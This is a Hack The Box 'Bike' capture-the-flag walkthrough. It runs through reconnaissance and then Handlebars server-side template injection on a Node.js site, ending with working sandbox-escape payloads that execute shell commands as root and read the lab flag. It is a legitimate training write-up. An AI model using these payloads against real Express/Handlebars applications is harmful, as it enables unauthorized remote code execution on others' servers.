# Bike

> 10.129.140.193

## Nmap
```
nmap -Pn -p- 10.129.140.193 --min-rate 1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 19:09 EST
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.07% done; ETC: 19:09 (0:00:00 remaining)
Nmap scan report for 10.129.140.193
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Nmap: Initial Service Version Scan
```
nmap -Pn -p 22,80 -sS -sV -sC -O 10.129.140.193
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 19:10 EST
Nmap scan report for 10.129.140.193
Host is up (0.048s latency).

PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  tcpwrapped
|_http-title:  Bike 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.20 seconds
```

## Nmap: Script http-enum
```
nmap -Pn 10.129.140.193 -sV --script http-enum 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 19:13 EST
Nmap scan report for 10.129.140.193
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.89 seconds
```

## Wappalyzer
![Pasted image 20240229181757](https://github.com/GregKedrovsky/Hacking/assets/26492233/0f6a9641-505c-4c4d-b74e-4810e722604d)
- `Node.js` is an open-source, cross-platform, back-end JavaScript runtime environment that can be used to build scalable network applications.
- `Express` is a minimal and flexible Node.js web application framework that provides a robust set of features for web and mobile applications.

## GoBuster
```
gobuster dir -u http://10.129.140.193/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.140.193/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/js                   (Status: 301) [Size: 171] [--> /js/]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

## Form Input
- The target website has an input field for an email address. When you put in an email address, it reflects it back in a response.
- XSS (e.g.,`<script>alert(1)</script>`) does not work. It is simply reflected back like an email address. 

## Template Engine
- Template Engines are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client.
- Template Engines, like all software, are prone to vulnerabilities, like for example Server Side Template Injection (SSTI).

## SSTI: Server-Side Template Injection
- [Server-side template injection](https://portswigger.net/research/server-side-template-injection) is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.
- SSTI is an exploitation technique where the attacker injects native (to the Template Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code execution on the affected server.
- This attack is very common on `Node.js` websites.
- You must first determine **_if_** you have a Template Engine.

## Template Engines
- Link: [Various exploitation techniques for various different template engines.](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- That site states: 

> Identifying the template engine involves analyzing error messages or manually testing various language-specific payloads. Common payloads causing errors include `${7/0}`, `{{7/0}}`, and `<%= 7/0 %>`. Observing the server's response to mathematical operations helps pinpoint the specific template engine.

- I plugged in `{{7*7}}` into the email input field and got the following error message.

```
Error: Parse error on line 1:
{{7*7}}
--^
Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)
    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)
    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)
    at router.post (/root/Backend/routes/handlers.js:14:16)
    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)
```
![Pasted image 20240229193134](https://github.com/GregKedrovsky/Hacking/assets/26492233/9521ac31-7d07-4a1d-8222-4dc9109c9fde)
- This means that the payload was indeed detected as valid by the template engine, however the code had some error and was unable to be executed. 
- An error is not always a bad thing. Here it provided valuable information: 
    - The server is running from the `/root/Backend` directory.
    - The Handlebars Template Engine is being used.

----
> Respawn: 10.129.97.64
----

## Exploit: Via Burp Suite
- Following the previous link to [hacktriks' SSTI how-to page](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).
- We followed his testing inputs and found out our site is running Handlebars. 
- [He has a write-up on exploiting Handlebars](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs)
- His exploit code: 

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

- NOTE THE LINE: `{{this.push "return require('child_process').exec('whoami');"}}`
- That line tests remote code execution with `whoami`

### Encode to URL
- Copy the above code and paste it into Burp's Decoder. Select `Encode as... URL`
- That should give you a long string of percent code. That's what we're going to use.

### Problem
- Start up Burp Suite. Turn on FoxyProxy. Use Burp's Proxy tab to capture a Submit from the website (anything will do). 
- Send the capture to Repeater... replace the text being sent via the Form with our URL encoded exploit.
![Pasted image 20240229203311](https://github.com/GregKedrovsky/Hacking/assets/26492233/f6980b28-67a1-49d1-bdb5-aae978719eb4)
- This does not work right outta the box. We get an error: The response shows an error that states `require is not defined`.  
- `require` is a keyword in Node.js that is used to load code from other modules or files. The above code is attempting to load the Child Process module into memory and use it to execute system commands (in this case `whoami`).
- Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. 

### Solution
- Node.js may allow the [process](https://nodejs.org/api/process.html#process) object and if it does, we can use that to load the `require` module. Need to test it first with this code (encode to URL, paste into Repeater): 

```
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process;"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

-  The line with `{{this.push "return process;"}}` should return `[object process]`. That indicates we can use this object.
- The `process` object has a [mainModule](https://nodejs.org/api/process.html#processmainmodule). It is deprecated, but it still might be available and useful ([blog post on the module](https://www.geeksforgeeks.org/node-js-process-mainmodule-property/)). 
- Test to see if the mainModule is accessible to us (encode to URL, paste into Repeater): 

```
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule;"}}                #  this is the line
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

- There is no error. We get an `[object Object]` return that indicates it worked. Accessible.
- Try to get a system command to work (encode to URL, paste into Repeater): 

```
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

- Line to watch: 
  `{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}`
- That should give you `root`

```
<p class="result">
  We will contact you at: e
  2
  [object Object]
  function Function() { [native code] }
  2
  [object Object]
  root                                     #  <<-- whomai returned "root"
</p>
```

- Now just replace `whoami` with `ls /root` and you should see the flag file. Use `cat /root/flag.txt` in the line above (encode to URL, paste into Repeater). Should get it.

```
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('ls /root');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

- The returns the response:

```
<p class="result">
  We will contact you at: e
  2
  [object Object]
  function Function() { [native code] }
  2
  [object Object]
  Backend
  flag.txt
  snap
</p>
```

- Now use the same code to `cat` the flag:

```
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

- Response:

```
<p class="result">
  We will contact you at: e
  2
  [object Object]
  function Function() { [native code] }
  2
  [object Object]
  6b258d726d287462d60c103d0142a81c            #  <<-- flag.txt
</p>
```

## Pwned
https://www.hackthebox.com/achievement/machine/172151/449


